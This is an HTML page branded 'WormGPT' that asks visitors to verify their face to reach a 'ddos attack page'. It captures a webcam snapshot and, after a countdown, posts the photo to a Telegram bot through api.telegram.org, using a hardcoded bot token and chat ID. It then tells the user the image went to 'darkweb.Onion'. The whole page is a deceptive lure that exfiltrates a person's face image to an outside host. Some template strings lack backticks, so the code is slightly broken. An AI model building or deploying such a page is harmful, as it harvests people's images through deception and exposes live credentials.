<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Camera Fun • WormGPT</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    :root {
      --surface: #ffffff;
      --primary: #3b82f6;
      --primary-dark: #2563eb;
      --text: #0f172a;
    }

    *, *::before, *::after {
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', system-ui, sans-serif;
      margin: 0;
      padding: 2rem 1rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      position: relative;
      min-height: 100vh;
      z-index: 0;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      z-index: -1;
      background: linear-gradient(135deg, #10b981, #3b82f6, #000, #fff);
      background-size: 400% 400%;
      animation: gradientMove 15s ease infinite;
    }

    @keyframes gradientMove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    h1 {
      font-weight: 600;
      margin-bottom: 1.5rem;
      color: white;
      text-shadow: 1px 1px 4px black;
    }

    video, canvas {
      width: 320px;
      height: auto;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
      max-width: 100%;
    }

    #capture {
      margin-top: 1.25rem;
      padding: 0.75rem 1.5rem;
      font-size: 1rem;
      font-weight: 500;
      color: #fff;
      background: var(--primary);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.25s ease;
    }

    #capture:hover {
      background: var(--primary-dark);
    }

    #snapshot {
      margin-top: 1rem;
      width: 320px;
      height: auto;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
      display: none;
    }

    #countdown {
      margin-top: 1rem;
      font-size: 1.5rem;
      font-weight: 600;
      color: white;
      text-shadow: 1px 1px 4px black;
    }

    #overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s ease;
      z-index: 1000;
    }

    #overlay.show {
      opacity: 1;
      pointer-events: all;
    }

    @keyframes popUp {
      0% { transform: translateY(40px) scale(0.95); opacity: 0; }
      100% { transform: translateY(0) scale(1); opacity: 1; }
    }

    .modal {
      background: var(--surface);
      border-radius: 16px;
      padding: 2.5rem 2.75rem;
      width: min(90vw, 460px);
      text-align: center;
      box-shadow: 0 12px 32px rgba(0,0,0,0.12);
      animation: popUp 0.45s cubic-bezier(.35,1.35,.4,1.0) forwards;
    }

    .modal h2 { margin: 0 0 0.5rem; font-weight: 600; }
    .modal p { margin: 0 0 1.5rem; color: #475569; }

    .next-btn {
      display: inline-block;
      padding: 0.75rem 1.75rem;
      font-size: 1rem;
      font-weight: 500;
      color: #fff;
      background: var(--primary);
      border-radius: 8px;
      text-decoration: none;
      transition: background 0.25s ease;
    }

    .next-btn:hover { background: var(--primary-dark); }
  </style>
</head>
<body>
  <h1>Verify your face before getting access to the main ddos attack page</h1>

  <video id="camera" autoplay playsinline muted></video>
  <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
  <button id="capture">Capture</button>

  <div id="countdown"></div>
  <img id="snapshot" alt="Snapshot preview"/>
  <div id="overlay">
    <div class="modal">
      <h2>Photo Sent! ✅</h2>
      <p>Your snapshot was successfully delivered to darkweb.Onion.</p>
      <a class="next-btn" href="next.html">Continue</a>
    </div>
  </div>

  <script>
    ;(async () => {
      const video = document.getElementById('camera');
      const canvas = document.getElementById('canvas');
      const img = document.getElementById('snapshot');
      const captureBtn = document.getElementById('capture');
      const overlay = document.getElementById('overlay');
      const countdownEl = document.getElementById('countdown');

      const CHAT_ID = '6981959913';
      const BOT_TOKEN = '7710567257:AAFv_PFqpa2SAh2Xq-dV-Q3xcqfHso-9H1U';

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (err) {
        alert('Could not access camera: ' + err.message);
        return;
      }

      captureBtn.addEventListener('click', async () => {
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        img.src = canvas.toDataURL('image/png');
        img.style.display = 'block';

        let seconds = 5;
        countdownEl.textContent = Sending in ${seconds} seconds...;

        const blob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));

        const timer = setInterval(async () => {
          seconds--;
          countdownEl.textContent = Sending in ${seconds} seconds...;

          if (seconds <= 0) {
            clearInterval(timer);
            countdownEl.textContent = '';

            try {
              const form = new FormData();
              form.append('chat_id', CHAT_ID);
              form.append('photo', blob, 'snapshot.png');

              const res = await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
                method: 'POST',
                body: form
              });

              const data = await res.json();
              if (!data.ok) throw new Error(JSON.stringify(data));

              console.log('✅ Photo sent to wormgpt!', data.result);
              overlay.classList.add('show');
            } catch (err) {
              alert('Failed to send photo: ' + err.message);
            }
          }
        }, 1000);
      });
    })();
  </script>
</body>
    </html>
